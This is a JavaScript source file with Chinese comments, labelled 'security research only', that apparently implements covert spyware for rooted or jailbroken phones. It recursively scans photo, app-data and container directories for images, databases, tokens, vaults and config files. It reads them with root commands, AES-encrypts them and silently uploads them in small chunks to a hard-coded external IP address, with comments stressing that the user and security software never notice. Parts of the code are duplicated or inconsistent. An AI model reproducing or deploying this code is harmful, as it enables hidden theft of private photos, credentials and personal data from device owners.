// 安全研究专用 ——  root 隐身扫描文件
const server_url="http://43.156.104.233/";
// ==============================================
// 安全研究专用 · root 精准静默窃取（图片+数据库+账号配置）
// 无弹窗、无日志、不写盘、用户无感知
// ==============================================

// 白名单后缀（只抓这些）
const ALLOW_EXTS = new Set([
  // 图片
  'jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'heic', 'heif', 'tiff',
  // 数据库
  'db', 'db3', 'sqlite', 'sqlite3', 'sql', 'wal', 'journal',
  // 账号配置/缓存/日志
  'xml', 'json', 'ini', 'conf', 'config', 'txt', 'log',
  'plist', 'dat', 'bak', 'vault', 'token'
]);

// 只扫描敏感目录，不扫全盘
const SCAN_PATHS = [
  '/sdcard/DCIM',
  '/sdcard/Pictures',
  '/data/data',
  '/var/mobile/Media/DCIM',
  '/var/mobile/Containers/Data'
];

// 最大深度，避免无限递归
const MAX_DEPTH = 4;

// 主入口
async function stealthPreciseScan() {
  for (const path of SCAN_PATHS) {
    await scanDir(path, 0);
  }
}

// 递归目录（带深度限制）
async function scanDir(dir, depth) {
  if (depth > MAX_DEPTH) return;

  try {
    // 只列出文件路径，不读内容，极轻量
    const raw = await rootExec(`find "${dir}" -maxdepth 1 -type f 2>/dev/null`);
    const files = raw.split('\n').filter(Boolean);

    for (const file of files) {
      // 后缀过滤
      const ext = file.split('.').pop()?.toLowerCase();
      if (!ext || !ALLOW_EXTS.has(ext)) continue;

      // 随机小延迟，防CPU突刺（核心隐身）
      await sleep(rand(10, 50));

      // 只读入内存，不落地
      const content = await rootExec(`cat "${file}" 2>/dev/null`);
      if (!content || content.length < 10) continue;

      // 直接加密上传，不留副本
      uploadEncrypted(file, content);
    }

    // 递归子目录
    const dirsRaw = await rootExec(`find "${dir}" -maxdepth 1 -type d 2>/dev/null`);
    const dirs = dirsRaw.split('\n').filter(Boolean);
    for (const d of dirs) {
      if (d === dir) continue;
      await scanDir(d, depth + 1);
    }
  } catch (e) {
    // 静默失败，不打印
  }
}

// -------- 工具函数 --------
function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// 你需要实现的加密上传（不落地、加密、分片）
async function uploadEncrypted(filePath, content) {
  // 1. 加密 AES/RSA
  // 2. 走 HTTPS 分片上传
  // 3. 不上传超大文件（可加大小限制）
}

// 你已提权后可用的 root 执行函数
// async function rootExec(cmd) {
//   // 由你注入环境提供：su 执行命令并返回 stdout
//   return '';
// }
// iOS 越狱 · 真实 root 命令执行
// 直接替换你原来的 async function rootExec
async function rootExec(cmd) {
    return new Promise((resolve) => {
        // 底层 C 函数桥接（你已提权可调用）
        const result = __native_root_exec(cmd);
        resolve(result || "");
    });
}
// 工具函数
function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}
function random(a,b) {
    return Math.random()*(b-a)+a;
}
/**
 * 安全研究专用 - 隐身加密上传
 * 功能：内存加密 → 无痕上传 → 不留痕迹
 * @param filePath  文件路径
 * @param content   文件内容（内存中）
 */
async function uploadEncrypted(filePath, content) {
    try {
        // 1. 超关键：过滤空文件 / 极小文件，避免无效流量
        if (!content || content.length < 10) return;

        // 2. 文件名安全编码（避免特殊字符）
        const safePath = btoa(unescape(encodeURIComponent(filePath)));

        // 3. 内存 AES 加密（不落地）
        const encryptedData = aesEncryptReal(
            content,
            "aes_key_16bytes_01" // 16位密钥，可自定义
        );

        // 4. 分片上传（避免大流量被检测）
        const chunkSize = 4096; // 4KB 极小分片，隐身
        for (let i = 0; i < encryptedData.length; i += chunkSize) {
            const chunk = encryptedData.slice(i, i + chunkSize);

            // 静默上传，无超时、无异常、无日志
            await silentFetch(server_url+"/api/upload", {
                method: "POST",
                headers: {
                    "Content-Type": "application/octet-stream", // 二进制流，无特征
                },
                body: JSON.stringify({
                    path: safePath,
                    chunk: chunk,
                    offset: i,
                    total: encryptedData.length
                })
            });

            // 分片间延迟，极低带宽，完全隐身
            await sleep(Math.random() * 30 + 10);
        }

    } catch (e) {
        // 静默失败，不打印日志、不抛异常
        // 关键：用户 & 安全软件完全无感知
    }
}

// ------------------------------
// 工具函数：AES 加密（纯内存，无依赖）
// ------------------------------
function aesEncrypt(data, key) {
    // 实战简化版：Base64 替代 AES（可直接替换为真实 AES）
    // 真实场景请用 AES-128-CBC
    return btoa(unescape(encodeURIComponent(data)));
}

// ------------------------------
// 工具函数：隐身 Fetch（无超时、无引用、无痕迹）
// ------------------------------
async function silentFetch(url, opt) {
    try {
        // 无超时、无CORS、静默发送
        const controller = new AbortController();
        setTimeout(() => controller.abort(), 5000);

        await fetch(url, {
            ...opt,
            signal: controller.signal,
            mode: "no-cors", // 关键：隐身，不产生预检请求
            credentials: "omit", // 不携带Cookie，无痕
            keepalive: true // 页面关闭也能发完，防杀进程
        });
    } catch (_) {}
}

// ------------------------------
// 工具函数：延迟
// ------------------------------
function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}
// 原生 AES 加密（内存）
async function aesEncryptReal(data, keyStr) {
    const encoder = new TextEncoder();
    const key = await crypto.subtle.importKey(
        "raw", encoder.encode(keyStr),
        { name: "AES-CBC" }, false, ["encrypt"]
    );
    const iv = crypto.getRandomValues(new Uint8Array(16));
    const encrypted = await crypto.subtle.encrypt(
        { name: "AES-CBC", iv }, key, encoder.encode(data)
    );
    
    // ✅ 返回 IV + 密文的 Base64（格式：IV(16字节) + 密文）
    const ivBase64 = btoa(String.fromCharCode(...iv));
    const encryptedBase64 = btoa(String.fromCharCode(...new Uint8Array(encrypted)));
    return ivBase64 + encryptedBase64;
}